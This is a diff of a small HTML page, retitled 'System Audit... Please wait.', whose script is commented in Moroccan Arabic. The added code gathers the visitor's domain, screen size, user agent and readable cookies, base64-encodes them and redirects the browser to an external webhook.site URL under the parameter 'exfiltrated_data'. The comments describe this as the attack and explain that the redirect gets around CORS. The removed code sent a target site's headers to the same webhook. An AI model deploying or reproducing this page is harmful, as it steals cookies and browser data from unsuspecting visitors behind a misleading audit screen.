@@ -1,21 +1,25 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Security Analysis...</h1>
+    <h1>System Audit... Please wait.</h1>
     <script>
         var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+
+        // غانحاولو نسرقو المعلومات اللي كيقدر يقرأها المتصفح بلا قيود CORS
+        // ونضيفو ليها تجربة الـ Redirect باش نثبتو أننا نقدروا نخرجو داتا
         
-        // محاولة بسيطة لقراءة الهيدرز فقط
-        fetch('https://www.decathlon.com/', { method: 'OPTIONS' })
-        .then(res => {
-            var headers = "";
-            res.headers.forEach((v, k) => { headers += k + ": " + v + " | "; });
-            window.location.href = webhook + "?headers=" + btoa(headers);
-        })
-        .catch(err => {
-            // إذا تبلوكا، غانصيفطو نوع الخطأ بالتفصيل
-            window.location.href = webhook + "?debug=" + btoa(err.message);
-        });
+        var info = {
+            domain: document.domain,
+            screen: window.screen.width + "x" + window.screen.height,
+            ua: navigator.userAgent,
+            cookies_visible: document.cookie // غايصيفط غير اللي ماشي HttpOnly
+        };
+
+        var payload = btoa(JSON.stringify(info));
+
+        // هادي هي الضربة: كنصيفطو الداتا عبر URL Redirect 
+        // هاد الطريقة ما كيحبسهاش CORS حيت المتصفح كيعتبرها "Navigation"
+        window.location.href = webhook + "?exfiltrated_data=" + payload;
     </script>
 </body>
 </html>
